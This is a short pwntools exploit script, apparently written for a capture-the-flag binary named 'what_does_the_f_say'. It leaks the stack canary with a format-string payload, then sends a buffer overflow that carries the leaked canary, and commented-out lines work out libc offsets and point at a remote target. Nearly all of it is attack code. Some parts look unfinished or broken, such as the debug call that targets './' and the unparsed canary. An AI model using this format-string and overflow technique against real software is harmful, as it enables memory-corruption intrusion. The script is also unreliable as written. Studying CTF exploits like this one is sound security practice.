from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./what_does_the_f_say")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}

#p = process("./what_does_the_f_say")
p = gdb.debug("./", '''break *main
''')
#p = remote("1.2.3.4", 30246)

# Format string vuln
payload = ""
#payload += "AAAAAAAA"
#payload += "%8$p "     # Ex. "A" Padding
#payload += "%3$p "     # Ex. __libc_read+18 leak
payload += "%13$p"      # Ex. Canary Leak

# Stack Canary Leak
p.send(payload)
canary_leak = p.recv()
print "Canary Leak: ", canary_leak

# Overflow with Canary Bypass
payload2 = ""
payload2 += "A" * 24
payload2 += canary_leak

p.sendline(payload2)
p.recvline()

# Calculate offset with libc_read_leak
# libc_read_leak = int(p.recvline(), 16) - 18
# libc_main = libc_read_leak - 957952
# print "libc read leak: ", hex(libc_read_leak)
# print "libc main: ", hex(libc_main)

p.interactive()

